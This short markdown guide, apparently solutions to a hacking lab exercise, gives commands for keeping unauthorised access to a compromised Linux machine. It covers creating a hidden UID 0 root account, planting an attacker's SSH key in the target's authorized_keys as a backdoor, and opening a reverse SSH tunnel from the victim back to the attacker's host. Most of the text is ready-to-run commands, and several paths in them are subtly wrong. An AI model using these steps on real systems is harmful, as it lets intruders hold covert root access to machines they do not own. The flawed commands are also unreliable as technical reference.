# Solutions for Persistence

### Add a root user

> sudo useradd -ou 0 -g 0 user_you_want_to_create

> sudo passwd user_you_created

> echo password_you_created | passwd --stdin user_you_created 

Now you have created a new root user!

### SSH Backdoor

You'll need to generate public/private keypair for the ssh to work. You can generate your keypair by giving the command:
> ssh-keygen

It will generate a private key __.ssh/id_rsa__ and a public key __.ssh/id_rsa.pub__.

Copy the public key to the target machine's __.ssh/authorized_keys__ file, it can be usually found in the home directory. This can be done by

> scp ~/.ssh/id_rsa.pub TARGET_USER@TARGET_IP:/~/.ssh/

And now in the target machines, give the command:
> cat ~/.ssh/id_rsa.pub >> authorized_keys 

This will copy the the public key into the authorized_keys file.

Remember to set the right permissions for the file, so you won't get any weird failures in the future.

> chmod 700 /~

> chmod 700 /~/.ssh

> chmod 600 /~/.ssh/authorized_keys

Now you can ssh to the target machine!
> ssh -i ~/.ssh/id_rsa victim@victimip

If this fails, you can try to create reverse SSH tunnel, and get the target machine to  contact you.

> ssh -N -R 9999:localhost:22 your_machine@your_ip

-N flag sets up the tunnel without promting a shell on your machine.

On your machine, check that your machine is listening the port 9999 by using the command:
> netstat -l

If everything is good, run on your machine:
>ssh -i ~/.ssh/id_rsa target_user@localhost -p 9999 

Reverse shell backdoor set up!
